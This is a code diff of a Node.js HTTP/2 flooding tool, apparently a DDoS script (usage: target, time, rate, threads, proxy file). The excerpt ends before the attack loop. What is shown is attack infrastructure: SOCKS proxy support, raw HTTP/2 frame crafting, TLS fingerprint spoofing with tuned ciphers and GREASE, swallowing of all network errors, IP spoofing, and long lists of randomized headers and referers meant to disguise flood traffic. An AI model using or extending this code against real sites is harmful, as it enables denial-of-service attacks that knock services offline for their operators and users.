@@ -1,693 +1,823 @@
 const net = require("net");
- const http2 = require("http2");
- const tls = require("tls");
- const cluster = require("cluster");
- const url = require("url");
- const crypto = require("crypto");
- const fs = require("fs");
- const axios = require('axios');
- const cheerio = require('cheerio'); 
- const gradient = require("gradient-string")
+const http2 = require("http2");
+const http = require('http');
+const tls = require("tls");
+const cluster = require("cluster");
+const url = require("url");
+const socks = require('socks').SocksClient;
+const crypto = require("crypto");
+const HPACK = require('hpack');
+const fs = require("fs");
+const os = require("os");
+const colors = require("colors");
+const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
+const ciphers = "GREASE:" + [
+    defaultCiphers[2],
+    defaultCiphers[1],
+    defaultCiphers[0],
+    ...defaultCiphers.slice(3)
+].join(":");
+function encodeSettings(settings) {
+    const data = Buffer.alloc(6 * settings.length);
+    settings.forEach(([id, value], i) => {
+        data.writeUInt16BE(id, i * 6);
+        data.writeUInt32BE(value, i * 6 + 2);
+    });
+    return data;
+}
 
- process.setMaxListeners(0);
- require("events").EventEmitter.defaultMaxListeners = 0;
- process.on('uncaughtException', function (exception) {
-  });
+function encodeFrame(streamId, type, payload = "", flags = 0) {
+    const frame = Buffer.alloc(9 + payload.length);
+    frame.writeUInt32BE(payload.length << 8 | type, 0);
+    frame.writeUInt8(flags, 4);
+    frame.writeUInt32BE(streamId, 5);
+    if (payload.length > 0) frame.set(payload, 9);
+    return frame;
+}
 
- if (process.argv.length < 7){console.log(gradient.passion(`node FLOODS.js <HOST> <TIME> <RPS> <THREADS> <PROXY>.`));; process.exit();}
- const headers = {};
-  function readLines(filePath) {
-     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
- }
- 
- function randomIntn(min, max) {
-     return Math.floor(Math.random() * (max - min) + min);
- }
- 
+function getRandomInt(min, max) {
+  return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+
+function randomIntn(min, max) {
+  return Math.floor(Math.random() * (max - min + 1)) + min;
+}
  function randomElement(elements) {
      return elements[randomIntn(0, elements.length)];
- } 
- 
- function randstr(length) {
-   const characters =
-     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-   let result = "";
-   const charactersLength = characters.length;
-   for (let i = 0; i < length; i++) {
-     result += characters.charAt(Math.floor(Math.random() * charactersLength));
-   }
-   return result;
  }
+    
+  function randstr(length) {
+		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+		let result = "";
+		const charactersLength = characters.length;
+		for (let i = 0; i < length; i++) {
+			result += characters.charAt(Math.floor(Math.random() * charactersLength));
+		}
+		return result;
+	}
+  function generateRandomString(minLength, maxLength) {
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
+ const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
+ const randomStringArray = Array.from({ length }, () => {
+   const randomIndex = Math.floor(Math.random() * characters.length);
+   return characters[randomIndex];
+ });
+
+ return randomStringArray.join('');
+}
+    const cplist = [
+  "TLS_AES_128_CCM_8_SHA256",
+  "TLS_AES_128_CCM_SHA256",
+  "TLS_CHACHA20_POLY1305_SHA256",
+  "TLS_AES_256_GCM_SHA384",
+  "TLS_AES_128_GCM_SHA256"
+ ];
+ var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
+  const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
+  const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];
+process.on('uncaughtException', function(e) {
+	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
+}).on('unhandledRejection', function(e) {
+	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
+}).on('warning', e => {
+	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
+}).setMaxListeners(0);
+ require("events").EventEmitter.defaultMaxListeners = 0;
+ const sigalgs = [
+     "ecdsa_secp256r1_sha256",
+          "rsa_pss_rsae_sha256",
+          "rsa_pkcs1_sha256",
+          "ecdsa_secp384r1_sha384",
+          "rsa_pss_rsae_sha384",
+          "rsa_pkcs1_sha384",
+          "rsa_pss_rsae_sha512",
+          "rsa_pkcs1_sha512"
+] 
+  let SignalsList = sigalgs.join(':')
+const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
+const secureOptions = 
+ crypto.constants.SSL_OP_NO_SSLv2 |
+ crypto.constants.SSL_OP_NO_SSLv3 |
+ crypto.constants.SSL_OP_NO_TLSv1 |
+ crypto.constants.SSL_OP_NO_TLSv1_1 |
+ crypto.constants.SSL_OP_NO_TLSv1_3 |
+ crypto.constants.ALPN_ENABLED |
+ crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
+ crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
+ crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
+ crypto.constants.SSL_OP_COOKIE_EXCHANGE |
+ crypto.constants.SSL_OP_PKCS1_CHECK_1 |
+ crypto.constants.SSL_OP_PKCS1_CHECK_2 |
+ crypto.constants.SSL_OP_SINGLE_DH_USE |
+ crypto.constants.SSL_OP_SINGLE_ECDH_USE |
+ crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
+ if (process.argv.length < 7){console.log(`.`); process.exit();}
+ const secureProtocol = "TLS_method";
+ const headers = {};
  
- const ip_spoof = () => {
-   const getRandomByte = () => {
-     return Math.floor(Math.random() * 255);
-   };
-   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
+ const secureContextOptions = {
+     ciphers: ciphers,
+     sigalgs: SignalsList,
+     honorCipherOrder: true,
+     secureOptions: secureOptions,
+     secureProtocol: secureProtocol
  };
  
- const spoofed = ip_spoof();
- 
+ const secureContext = tls.createSecureContext(secureContextOptions);
  const args = {
      target: process.argv[2],
-     time: parseInt(process.argv[3]),
-     Rate: parseInt(process.argv[4]),
-     threads: parseInt(process.argv[5]),
-     proxyFile: process.argv[6]
+     time: ~~process.argv[3],
+     Rate: ~~process.argv[4],
+     threads: ~~process.argv[5],
+     proxyFile: process.argv[6],
  }
- const sig = [    
-    'ecdsa_secp256r1_sha256',
-    'ecdsa_secp384r1_sha384',
-    'ecdsa_secp521r1_sha512',
-    'rsa_pss_rsae_sha256',
-    'rsa_pss_rsae_sha384',
-    'rsa_pss_rsae_sha512',
-    'rsa_pkcs1_sha256',
-    'rsa_pkcs1_sha384',
-    'rsa_pkcs1_sha512', 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
- 'ecdsa_brainpoolP256r1tls13_sha256',
- 'ecdsa_brainpoolP384r1tls13_sha384',
- 'ecdsa_brainpoolP512r1tls13_sha512',
- 'ecdsa_sha1',
- 'ed25519',
- 'ed448',
- 'ecdsa_sha224',
- 'rsa_pkcs1_sha1',
- 'rsa_pss_pss_sha256',
- 'dsa_sha256',
- 'dsa_sha384',
- 'dsa_sha512',
- 'dsa_sha224',
- 'dsa_sha1',
- 'rsa_pss_pss_sha384',
- 'rsa_pkcs1_sha2240',
- 'rsa_pss_pss_sha512',
- 'sm2sig_sm3',
- 'ecdsa_secp521r1_sha512',
- ];
- const sigalgs1 = sig.join(':');
- const cplist = [
-    'ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES',
-    'ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES',
-    'ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES',
-    'ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES',
-    'ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES',
-    'ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES',
-    'ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES',
-     'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
- 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
- 'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
- 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
- "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
- "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
- "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
- "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
- "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
- "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
- 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
- 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
- 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
- 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
- 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
- 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
- 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
- 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
- 'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
- 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
- "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
- "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
- "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
- "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
- "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
- "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
- 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
- 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
- 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
- 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
- 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
- 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
- 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
- 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
- ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
- 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
- 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
- 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
- ];
- const accept_header = [
-     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 
-     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
-     'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-       'application/json',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
-  'text/html; charset=utf-8',
-  'application/json, text/plain, */*',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
- ]; 
- const lang_header = [
-  'ko-KR',
-  'en-US',
-  'zh-CN',
-  'zh-TW',
-  'ja-JP',
-  'en-GB',
-  'en-AU',
-  'en-GB,en-US;q=0.9,en;q=0.8',
-  'en-GB,en;q=0.5',
-  'en-CA',
-  'en-UK, en, de;q=0.5',
-  'en-NZ',
-  'en-GB,en;q=0.6',
-  'en-ZA',
-  'en-IN',
-  'en-PH',
-  'en-SG',
-  'en-HK',
-  'en-GB,en;q=0.8',
-  'en-GB,en;q=0.9',
-  ' en-GB,en;q=0.7',
-  '*',
-  'en-US,en;q=0.5',
-  'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
-  'utf-8, iso-8859-1;q=0.5, *;q=0.1',
-  'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
-  'en-GB, en-US, en;q=0.9',
-  'de-AT, de-DE;q=0.9, en;q=0.5',
-  'cs;q=0.5',
-  'da, en-gb;q=0.8, en;q=0.7',
-  'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
-  'en-US,en;q=0.9',
-  'de-CH;q=0.7',
-  'tr',
-  'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
-  ];
  
- const encoding_header = [
- 'gzip, deflate, br',
- 'compress, gzip',
-  'deflate, gzip',
-  'gzip, identity',
-  '*'
-];
- 
- const control_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400'];
- 
- const refers = [
-     "https://www.google.com/",
-     "https://www.facebook.com/",
-     "https://www.twitter.com/",
-     "https://www.youtube.com/",
-     "https://www.xcddos.my.id/",
-       "https://www.google.com/search?q=",
-  "https://check-host.net/",
-  "https://www.facebook.com/",
-  "https://www.youtube.com/",
-  "https://www.fbi.com/",
-  "https://www.bing.com/search?q=",
-  "https://r.search.yahoo.com/",
-  "https://www.cia.gov/index.html",
-  "https://vk.com/profile.php?redirect=",
-  "https://www.usatoday.com/search/results?q=",
-  "https://help.baidu.com/searchResult?keywords=",
-  "https://steamcommunity.com/market/search?q=",
-  "https://www.ted.com/search?q=",
-  "https://play.google.com/store/search?q=",
-  "https://www.qwant.com/search?q=",
-  "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
-  "https://www.google.ad/search?q=",
-  "https://www.google.ae/search?q=",
-  "https://www.google.com.af/search?q=",
-  "https://www.google.com.ag/search?q=",
-  "https://www.google.com.ai/search?q=",
-  "https://www.google.al/search?q=",
-  "https://www.google.am/search?q=",
-  "https://www.google.co.ao/search?q=",
-  "http://anonymouse.org/cgi-bin/anon-www.cgi/",
-  "http://coccoc.com/search#query=",
-  "http://ddosvn.somee.com/f5.php?v=",
-  "http://engadget.search.aol.com/search?q=",
-  "http://engadget.search.aol.com/search?q=query?=query=&q=",
-  "http://eu.battle.net/wow/en/search?q=",
-  "http://filehippo.com/search?q=",
-  "http://funnymama.com/search?q=",
-  "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
-  "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
-  "http://go.mail.ru/search?mail.ru=1&q=",
-  "http://help.baidu.com/searchResult?keywords=",
-  "http://host-tracker.com/check_page/?furl=",
-  "http://itch.io/search?q=",
-  "http://jigsaw.w3.org/css-validator/validator?uri=",
-  "http://jobs.bloomberg.com/search?q=",
-  "http://jobs.leidos.com/search?q=",
-  "http://jobs.rbs.com/jobs/search?q=",
-  "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=",
-  "http://louis-ddosvn.rhcloud.com/f5.html?v=",
-  "http://millercenter.org/search?q=",
-  "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=",
-  "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/",
-  "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=",
-  "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/",
-  "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=",
-  "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=",
-  "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=",
-  "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/",
-  "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=",
-  "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/",
-  "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=",
-  "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/",
-  "http://search.aol.com/aol/search?q=",
-  "http://taginfo.openstreetmap.org/search?q=",
-  "http://techtv.mit.edu/search?q=",
-  "http://validator.w3.org/feed/check.cgi?url=",
-  "http://vk.com/profile.php?redirect=",
-  "http://www.ask.com/web?q=",
-  "http://www.baoxaydung.com.vn/news/vn/search&q=",
-  "http://www.bestbuytheater.com/events/search?q=",
-  "http://www.bing.com/search?q=",
-  "http://www.evidence.nhs.uk/search?q=",
-  "http://www.google.com/?q=",
-  "http://www.google.com/translate?u=",
-  "http://www.google.ru/url?sa=t&rct=?j&q=&e&q=",
-  "http://www.google.ru/url?sa=t&rct=?j&q=&e/",
-  "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
-  "http://www.pagescoring.com/website-speed-test/?url=",
-  "http://www.reddit.com/search?q=",
-  "http://www.search.com/search?q=",
-  "http://www.shodanhq.com/search?q=",
-  "http://www.ted.com/search?q=",
-  "http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
-  "http://www.usatoday.com/search/results?q=",
-  "http://www.ustream.tv/search?q=",
-  "http://yandex.ru/yandsearch?text=",
-  "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=",
-  "http://ytmnd.com/search?q=",
-  "https://add.my.yahoo.com/rss?url=",
-  "https://careers.carolinashealthcare.org/search?q=",
-  "https://check-host.net/",
